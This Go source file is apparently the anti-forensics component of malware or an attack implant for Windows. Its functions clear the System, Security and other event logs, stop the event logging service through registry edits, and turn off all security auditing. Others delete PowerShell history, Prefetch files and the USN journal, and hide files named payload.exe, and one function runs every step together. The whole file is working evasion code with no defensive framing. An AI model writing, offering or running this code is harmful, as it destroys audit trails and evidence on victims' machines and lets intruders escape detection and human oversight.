//go:build windows

package log_cleanup

import (
"os/exec"
"syscall"
"time"
"unsafe"
)

var (
kernel32             = syscall.NewLazyDLL("kernel32.dll")
procSleep            = kernel32.NewProc("Sleep")
)

func ClearAllWindowsLogs() bool {
commands := []string{
"wevtutil cl System",
"wevtutil cl Application",
"wevtutil cl Security",
"wevtutil cl Setup",
"wevtutil cl ForwardedEvents",
}

for _, cmd := range commands {
exec.Command("cmd", "/c", cmd).Run()
time.Sleep(500 * time.Millisecond)
}
return true
}

func ClearSpecificLog(logName string) bool {
cmd := exec.Command("cmd", "/c", "wevtutil cl "+logName)
err := cmd.Run()
return err == nil
}

func DisableEventLogging() bool {
commands := []string{
"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\" /v Start /t REG_DWORD /d 4 /f",
"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\" /v Start /t REG_DWORD /d 0 /f",
}

for _, cmd := range commands {
exec.Command("cmd", "/c", cmd).Run()
}
return true
}

func DisableSecurityAuditing() bool {
cmd := exec.Command("cmd", "/c", "auditpol /set /category:* /success:disable /failure:disable")
err := cmd.Run()
return err == nil
}

func ClearPowerShellHistory() bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\"")
err := cmd.Run()
return err == nil
}

func ClearPrefetch() bool {
cmd := exec.Command("cmd", "/c", "del /f /q C:\\Windows\\Prefetch\\*.*")
err := cmd.Run()
return err == nil
}

func ClearUSNJournal() bool {
cmd := exec.Command("cmd", "/c", "fsutil usn deletejournal /D C:")
err := cmd.Run()
return err == nil
}

func HideArtifacts() bool {
cmds := []string{
"attrib +h C:\\Windows\\Temp\\payload.exe",
"attrib +h C:\\Users\\Public\\payload.exe",
}
for _, cmd := range cmds {
exec.Command("cmd", "/c", cmd).Run()
}
return true
}

func FullCleanup() bool {
ClearAllWindowsLogs()
DisableEventLogging()
DisableSecurityAuditing()
ClearPowerShellHistory()
ClearPrefetch()
ClearUSNJournal()
HideArtifacts()
return true
}
